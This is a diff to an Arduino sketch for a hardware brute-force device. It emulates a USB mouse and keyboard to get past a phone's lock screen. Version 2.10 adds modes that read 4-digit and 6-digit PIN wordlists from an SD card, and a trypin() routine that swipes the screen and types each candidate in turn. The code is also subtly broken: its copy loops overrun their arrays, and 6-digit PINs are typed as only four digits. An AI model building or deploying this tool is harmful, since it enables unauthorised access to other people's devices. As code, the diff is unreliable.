@@ -38,6 +38,10 @@
  * corrected bug to not waking up for the first try
  * corrected bug to not executing movements of the candidates
  * 
+ * v2.10
+ * add pin input 
+ * added 3 types of wordlists - 4 pin optimized, 4 pin all (without values tried in optimized and 6 pin optimized
+ * 
  */
 
 //Carrega biblioteca mouse e teclado
@@ -50,7 +54,7 @@
 
 // Pin of cs of sd card module
 #define SDFILE_PIN_CS  2
-String sw_rev = "V 2.01";
+String sw_rev = "V 2.10";
 /*
  * x1 e y1 - ponto 1. usar funcao valida
  * c - distancia entre os pontos. usar funcao validatec para verificar valor
@@ -212,14 +216,17 @@ int menusize = 10;
 String menu[] = {
   "Menu",                         //0
   "Menu>Wordlist",                //1
-  "Menu>Wordlist>4p",             //2
-  "Menu>Wordlist>5p",             //3
-  "Menu>Wordlist>6p",             //4
-  "Menu>Wordlist>7p",             //5
-  "Menu>Wordlist>8p",             //6
-  "Menu>Wordlist>9p",             //7
-  "Menu>Validar c",               //8
-  "Menu>Validar h"                //9
+  "Menu>Wordlist>4pattern",       //2
+  "Menu>Wordlist>5pattern",       //3
+  "Menu>Wordlist>6pattern",       //4
+  "Menu>Wordlist>7pattern",       //5
+  "Menu>Wordlist>8pattern",       //6
+  "Menu>Wordlist>9pattern",       //7
+  "Menu>Wordlist>4pinopt",        //8
+  "Menu>Wordlist>4pinall",        //9
+  "Menu>Wordlist>6pinopt",        //10
+  "Menu>Validar c",               //11
+  "Menu>Validar h"                //12
 };
 
 int t;
@@ -541,11 +548,116 @@ void updateMenu () {
       }
       case 8:{
         lcd.clear();
+        lcd.print("crack 4 pin opt");
+        delay(5000);
+        sdFile = SD.open("4pinopt.txt", FILE_READ);
+          if (sdFile) {
+            int i = 1;
+            while(sdFile.available()){
+              lcd.clear();
+              lcd.setCursor(0, 0);
+              lcd.print("tentativa: ");
+              lcd.print(i);
+              //le nova linha*/
+              buffer = sdFile.readStringUntil('\n');
+              lcd.setCursor(0, 1);
+              lcd.print("cand: ");
+              lcd.print(buffer.substring(0, 4));
+              //move o mouse
+              char secuencia[4];
+              int k;
+              for(k=0;k<5;k++){
+                secuencia[k]= buffer[k];
+              }
+              trypin(secuencia, 4);
+              i++;
+            }
+          printEndTriesDisplay();
+          while(1);
+        }
+        else{
+          printFileErrorDisplay();
+          while(1);
+        }
+        break;
+      }
+      case 9:{
+        lcd.clear();
+        lcd.print("crack 4 pin all");
+        delay(5000);
+        sdFile = SD.open("4pinrest.txt", FILE_READ);
+          if (sdFile) {
+            int i = 1;
+            while(sdFile.available()){
+              lcd.clear();
+              lcd.setCursor(0, 0);
+              lcd.print("tentativa: ");
+              lcd.print(i);
+              //le nova linha*/
+              buffer = sdFile.readStringUntil('\n');
+              lcd.setCursor(0, 1);
+              lcd.print("cand: ");
+              lcd.print(buffer.substring(0, 4));
+              //move o mouse
+              char secuencia[4];
+              int k;
+              for(k=0;k<5;k++){
+                secuencia[k]= buffer[k];
+              }
+              trypin(secuencia, 4);
+              i++;
+            }
+          printEndTriesDisplay();
+          while(1);
+        }
+        else{
+          printFileErrorDisplay();
+          while(1);
+        }
+        break;
+      }
+      case 10:{
+        lcd.clear();
+        lcd.print("crack 6 pin opt");
+        delay(5000);
+        sdFile = SD.open("6pinopt.txt", FILE_READ);
+          if (sdFile) {
+            int i = 1;
+            while(sdFile.available()){
+              lcd.clear();
+              lcd.setCursor(0, 0);
+              lcd.print("tentativa: ");
+              lcd.print(i);
+              //le nova linha*/
+              buffer = sdFile.readStringUntil('\n');
+              lcd.setCursor(0, 1);
+              lcd.print("cand: ");
+              lcd.print(buffer.substring(0, 6));
+              //move o mouse
+              char secuencia[6];
+              int k;
+              for(k=0;k<7;k++){
+                secuencia[k]= buffer[k];
+              }
+              trypin(secuencia, 6);
+              i++;
+            }
+          printEndTriesDisplay();
+          while(1);
+        }
+        else{
+          printFileErrorDisplay();
+          while(1);
+        }
+        break;
+      }  
+      case 11:{
+        lcd.clear();
         lcd.print("Validando c");
         validatec(); // To calibrate ´c´ paramenter (Mouse Absolute shift)
         break;
       }
-      case 9:{
+      case 12:{
         lcd.clear();
         lcd.print("Validando h");
         checkh(); // To calibrate ´h´parameter (Mouse Relative shift) to conect two dots
@@ -1200,6 +1312,37 @@ void waitingtime(){
                           Mouse.release();
                         }
 }
+
+
+void trypin(char patron[], int longitud){
+  Keyboard.write(0x20);
+  Keyboard.println();
+  Mouse.begin();
+  MouseTo.setTarget(10, y1);
+  while (MouseTo.move() == false) {}
+  Mouse.press();
+  for (int cycle = 1; cycle <= 8; cycle++ )
+  { 
+      Mouse.move(0,-h);
+      delay(50);
+  }
+  Mouse.release();
+  delay(50);
+  Keyboard.write(0x20);
+  Keyboard.println();
+  
+  Keyboard.write(patron[0]);
+  delay(50);
+  Keyboard.write(patron[1]);
+  delay(50);
+  Keyboard.write(patron[2]);
+  delay(50);
+  Keyboard.write(patron[3]);
+  delay(50);
+  Keyboard.println();
+  waitingtime();
+}
+
 
 void movesequence(int patron[], int longitud){
 
